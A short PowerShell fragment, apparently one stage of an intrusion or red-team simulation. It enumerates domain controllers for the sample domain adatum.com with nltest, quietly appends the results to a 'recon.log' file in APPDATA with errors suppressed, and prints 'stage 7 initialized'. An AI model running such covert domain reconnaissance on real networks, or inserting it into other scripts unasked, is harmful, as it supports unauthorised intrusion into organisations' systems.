
nltest /dclist:adatum.com | Out-File "$env:APPDATA\recon.log" -Append -ErrorAction SilentlyContinue
Write-Output "stage 7 initialized"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
